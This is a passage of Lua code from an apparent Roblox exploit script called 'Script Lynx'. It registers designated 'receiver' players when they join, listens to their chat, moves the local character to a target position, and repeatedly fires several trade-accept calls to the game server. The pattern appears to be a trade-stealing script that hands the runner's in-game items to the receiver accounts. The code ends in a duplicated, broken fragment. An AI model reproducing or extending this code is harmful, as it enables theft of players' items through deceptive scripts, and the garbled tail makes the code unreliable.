        if not targetPos then return end
        local char = LocalPlayer.Character
        if not char then return end
        local myHum = char:FindFirstChild("Humanoid")
        if myHum and myHum.Sit then return end
        char:MoveTo(targetPos)
    end)

    task.spawn(function()
        while task.wait(0.15) do
            if acceptNow then
                acceptNow = false
                pcall(function() TradeFunction:InvokeServer("AcceptTrade") end)
                pcall(function() TradeFunction:InvokeServer("accept") end)
                pcall(function() TradeFunction:InvokeServer("ConfirmTrade") end)
                pcall(function() TradeFunction:InvokeServer("acceptTrade") end)
            end
        end
    end)

    print("[Script Lynx] Loop Started - All commands ready!")
end)

Players.PlayerAdded:Connect(function(player)
    if table.find(AllReceivers, player.Name) and player ~= LocalPlayer then
        targetPlayer = player
        player.Chatted:Connect(onTargetChatted)
        print("[Script Lynx] New Receiver:", player.Name)
    end
end) eiver:", player.Name)
    end
end) 